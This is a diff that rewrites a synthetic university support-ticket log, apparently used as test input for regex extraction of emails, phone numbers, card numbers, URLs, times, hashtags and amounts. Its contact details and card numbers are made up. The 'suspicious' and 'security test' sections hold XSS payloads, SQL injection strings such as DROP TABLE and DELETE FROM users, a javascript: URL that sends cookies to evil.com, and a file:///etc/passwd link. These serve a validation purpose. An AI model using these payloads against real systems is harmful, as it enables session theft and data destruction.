@@ -1,56 +1,136 @@
-=== Customer Support System Log - ALU Tech Department ===
-Date: 2024-05-15 | Ticket System v3.2
+====================================================
+ ALU INTERNAL COMMUNICATIONS & SYSTEM LOG ARCHIVE
+ Exported: 2024-03-15 | Classification: Internal Use
+====================================================
 
---- Ticket#1042 ---
-From: john.doe@gmail.com
-Subject: Cannot access student portal
+--- TICKET #4421 | Student Enrollment Portal ---
+From: admissions@alueducation.com
+To: Kahn.doe@alueducation.com
+CC: sarah.kimani@alumni.alueducation.com, tech-support@si.alueducation.com
+Date: 2024-03-12 09:14:32
 
-Hi support team,
-I've been trying to log in since 09:30 AM but keep getting errors.
-My student ID is linked to j.doe@alueducation.com
-Please contact me at +250 788 123 456 or visit https://portal.alueducation.com/login
-Payment reference for my last invoice: 4111 1111 1111 1111
-Amount paid: $350.00
+Hello Kahn,
 
---- Ticket#1043 ---
-From: alumni.sarah@alumni.alueducation.com
-Subject: Transcript request
+Please find below the updated contact list for the spring intake batch.
+If you have any questions, reach out via email or call our main office.
 
-Hello,
-I graduated in 2022 and need my transcript.
-You can reach me at +1 (555) 867-5309 or at sarah.k@yahoo.com
-I also paid the transcript fee of $25.50 via card: 5500 0000 0000 0004
-See the form here: https://alumni.alueducation.com/transcripts?id=9921&format=pdf
+Student Records (Batch 2024-A):
+  - Name: Alice Nkrumah       | Email: alice.nkrumah2024@alueducation.com    | Phone: +250-788-123-456
+  - Name: Bernard Osei        | Email: bernard.osei@alumni.alueducation.com   | Phone: +234 (0)80 1234 5678
+  - Name: Clara Mensah        | Email: c.mensah@si.alueducation.com           | Phone: +1-800-555-0199
+  - Name: David Achebe        | Email: david.achebe@gmail.com                 | Phone: +44 20 7946 0958
+  - Name: Erica Tamboli       | Email: erica.tamboli@yahoo.co.uk              | Phone: 0712 345 678
 
---- Ticket#1044 ---
-From: prof.mike@si.alueducation.com
-Subject: Lab booking system bug
+Payment Records (Partial - flagged for review):
+  Card on file: 4532 1234 5678 9010  (Visa - VALID)
+  Card on file: 5425 2334 3010 9903  (Mastercard - VALID)
+  Card on file: 3782-822463-10005    (Amex - VALID)
+  Card on file: 1234 5678 0000 0000  (Test card - FLAGGED)
+  Card on file: 9999-9999-9999-9999  (BLOCKED - do not process)
 
-The booking page at http://labs.si.alueducation.com/book crashes at 11:45 PM
-I tried submitting at 2:30 PM and 14:30 as well, both failed.
-My personal contact: mike.research@outlook.com | Phone: +44 20 7946 0823
-Invoice total: £120.00 | USD equivalent: $150.75
-Card used for equipment: 4012 8888 8888 1881
+---
 
---- Ticket#1045 ---
-From: <script>alert('xss')</script>@hacker.com
-Subject: '; DROP TABLE tickets; --
+--- TICKET #4422 | Website & Resource Links ---
 
-Hello I am a normal user hehe
-My card: 9999 9999 9999 9999
-Email: not-an-email@@broken..com
-Phone: 000-000-0000
-URL: javascript:void(document.cookie)
+The following URLs were submitted by students and staff via the help portal.
+Please audit and verify each link before embedding on the dashboard.
 
---- Ticket#1046 ---
-From: new.student@alueducation.com
-Subject: Hashtag campaign for orientation week
+  Valid resources:
+    https://www.alueducation.com/admissions
+    http://library.alueducation.com/resources?topic=regex&year=2024
+    https://docs.google.com/spreadsheets/d/1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgVE2upms
+    ftp://backup.alueducation.com/exports/march2024.zip
 
-Hey team,
-We are launching our campaign on social media!
-Follow us: #ALUOrientation2024 #NewStudents #KigaliCampus
-Check our page: https://www.instagram.com/alu_education
-Contact for sponsorship: sponsor@partner.org | +250 722 456 789
-Budget approved: $5,000.00
+  Suspicious submissions (do NOT embed):
+    javascript:alert('XSS attack!')
+    <script>document.cookie='stolen'</script>
+    http://192.168.0.1/admin?bypass=true
+    data:text/html,<h1>Phishing</h1>
 
-=== END OF LOG ===
+---
+
+--- TICKET #4423 | Schedule & Event Times ---
+
+Spring Orientation Schedule:
+  Opening Ceremony      -> 09:00 AM
+  Campus Tour           -> 11:30 AM
+  Lunch Break           -> 1:00 PM
+  Tech Panel Discussion -> 2:45 PM
+  Evening Networking    -> 6:00 PM
+  Curfew Reminder       -> 10:30 PM
+
+24-Hour IT Maintenance Window:
+  Backup Start          -> 22:30
+  Sync Complete         -> 23:59
+  System Restore        -> 00:15
+  Go-Live               -> 06:00
+
+---
+
+--- TICKET #4424 | Social Media Monitoring Log ---
+
+The following hashtags were detected across monitored platforms:
+  #ALU2024 #AfricanLeadership #TechForAfrica #Rwanda2024 #IgniteChange
+  #StudentLife #ALUAdmissions #BuildingAfrica #FutureLeaders #STEM
+
+Trending hashtags (flagged by automation):
+  ##doubleHash  #   #spaces not allowed  #123startwithnumber  #
+
+---
+
+--- TICKET #4425 | Finance Department Summary ---
+
+Processed transactions this quarter:
+
+  Invoice #INV-2024-001  | Amount: $12,500.00  | Status: Paid
+  Invoice #INV-2024-002  | Amount: $3,750.50   | Status: Pending
+  Invoice #INV-2024-003  | Amount: $500         | Status: Paid
+  Refund Processed       | Amount: -$250.00    | Status: Complete
+  Donation Received      | Amount: $1,000,000  | Status: Confirmed
+  International Wire     | Amount: 8,400.00  | Status: Processing
+  Stipend Disbursement   | Amount: 320.75     | Status: Paid
+
+---
+
+--- TICKET #4426 | HTML Template Audit ---
+
+Raw HTML snippets extracted from the student portal CMS:
+
+  <html>
+  <head><title>ALU Student Portal</title></head>
+  <body>
+    <h1>Welcome to ALU</h1>
+    <p class="intro">Start your journey here.</p>
+    <div id="dashboard">
+      <img src="banner.png" alt="ALU Banner" />
+      <a href="https://alueducation.com">Visit ALU</a>
+    </div>
+    <script>alert('debug mode')</script>
+  </body>
+  </html>
+
+---
+
+--- SECURITY TEST BLOCK ---
+
+  Emails (malformed or injection attempts):
+    not-an-email
+    @nodomain.com
+    user@@double.com
+    user@.missingdomain.com
+    "DROP TABLE users;"@alueducation.com
+    valid-but-suspicious@alueducation.com; DELETE FROM users;
+
+  Credit Cards (invalid or test numbers):
+    0000 0000 0000 0000
+    1234 5678 9012 3456
+    9999 9999 9999 9999
+
+  URLs (dangerous schemes):
+    javascript:void(document.location='http://evil.com/?c='+document.cookie)
+    vbscript:msgbox("hacked")
+    file:///etc/passwd
+
+====================================================
+ END OF ARCHIVE - Total Tickets: 6
+====================================================
